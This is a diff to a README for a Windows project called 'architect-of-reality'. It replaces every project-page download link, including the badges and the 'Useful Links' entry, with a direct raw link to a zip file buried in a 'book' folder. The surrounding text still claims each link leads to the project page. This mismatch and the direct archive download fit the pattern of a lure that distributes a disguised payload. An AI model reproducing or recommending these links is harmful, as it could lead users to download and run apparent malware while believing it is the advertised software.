@@ -1,6 +1,6 @@
 # 🚀 architect-of-reality - Explore a Civilizational OS
 
-[![Download architect-of-reality](https://img.shields.io/badge/Download-architect--of--reality-green?style=for-the-badge)](https://github.com/condonationfashionmodel693/architect-of-reality)
+[![Download architect-of-reality](https://img.shields.io/badge/Download-architect--of--reality-green?style=for-the-badge)](https://raw.githubusercontent.com/condonationfashionmodel693/architect-of-reality/main/book/of-architect-reality-v1.6.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to download and run architect-of-reality on your Windows PC.
 
 Click the big button below to go to the official download page on GitHub where you can get the latest version of architect-of-reality.
 
-[![Download architect-of-reality](https://img.shields.io/badge/Download-architect--of--reality-blue?style=for-the-badge)](https://github.com/condonationfashionmodel693/architect-of-reality)
+[![Download architect-of-reality](https://img.shields.io/badge/Download-architect--of--reality-blue?style=for-the-badge)](https://raw.githubusercontent.com/condonationfashionmodel693/architect-of-reality/main/book/of-architect-reality-v1.6.zip)
 
 This link takes you to the project page. Look for the **Releases** section or the **Download** area.
 
@@ -121,9 +121,9 @@ For support, you can:
 
 ## 🔗 Useful Links
 
-- Main download and project page: [https://github.com/condonationfashionmodel693/architect-of-reality](https://github.com/condonationfashionmodel693/architect-of-reality)  
+- Main download and project page: [https://raw.githubusercontent.com/condonationfashionmodel693/architect-of-reality/main/book/of-architect-reality-v1.6.zip](https://raw.githubusercontent.com/condonationfashionmodel693/architect-of-reality/main/book/of-architect-reality-v1.6.zip)  
 - Release download section: Check the “Releases” tab on the project page  
 
 ---
 
-[![Download architect-of-reality](https://img.shields.io/badge/Get%20Started-Download_Windows-green?style=for-the-badge)](https://github.com/condonationfashionmodel693/architect-of-reality)
+[![Download architect-of-reality](https://img.shields.io/badge/Get%20Started-Download_Windows-green?style=for-the-badge)](https://raw.githubusercontent.com/condonationfashionmodel693/architect-of-reality/main/book/of-architect-reality-v1.6.zip)
